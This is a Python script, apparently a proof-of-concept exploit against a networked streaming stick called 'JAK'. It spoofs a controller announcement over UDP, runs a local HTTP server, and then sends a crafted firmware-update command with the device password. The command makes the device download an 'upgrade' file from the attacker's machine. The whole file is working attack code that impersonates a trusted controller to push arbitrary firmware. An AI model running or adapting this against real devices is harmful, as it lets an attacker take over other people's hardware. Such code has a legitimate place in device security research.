import socket
import http.server
import socketserver
import threading
import struct


HTTP_PORT = 8000
FAKE_SERVER_PORT=10005
JAK_PW="12345678"
OWN_IP="172.18.18.103"
JAK_IP = "172.18.18.1"
UDP_PORT = 20000
MESSAGE = "CONN_NOTIFY,"+OWN_IP+":"+str(FAKE_SERVER_PORT)+",FakeDroid v4.4.4,uuid:36220724-95ff-4a61-a85e-f3859499f865"
UPGRADE_MESSAGE="http://"+OWN_IP+":"+str(HTTP_PORT)+"/upgrade.txt,"+JAK_PW

class ThreadedHTTPServer(socketserver.ThreadingMixIn,http.server.HTTPServer):
    pass
httpd = ThreadedHTTPServer(('', HTTP_PORT), http.server.SimpleHTTPRequestHandler)
httpd_thread = threading.Thread(target=httpd.serve_forever)
httpd_thread.daemon = True
httpd_thread.start()

# our local server to answer to the sticks requests
print("starting tcp server on port "+str(FAKE_SERVER_PORT))
our_server_address = ('0.0.0.0', FAKE_SERVER_PORT)
server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_sock.bind(our_server_address)
server_sock.listen(1)


#send UDP paket to the stick to notify it of our existence
print("notifying JAK")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
sock.sendto(bytes(MESSAGE, "utf-8"), (JAK_IP, UDP_PORT))
i=0
while True:
    # Wait for a connection
    connection, client_address = server_sock.accept()
    try:
        print ( 'connection from', client_address)
        data = connection.recv(1024)
        print('received "%s"' % data)
        data = connection.recv(1024)
        print('received "%s"' % data)
        print('trying to set upgrade.txt as upgrade target')
        
        connection.sendall( struct.pack(">BBH"+str(len(UPGRADE_MESSAGE))+"s1000x",1,11,len(UPGRADE_MESSAGE),bytes(UPGRADE_MESSAGE,"utf-8")))#update firmware command

    finally:
        pass
        # Clean up the connection
#        connection.close()
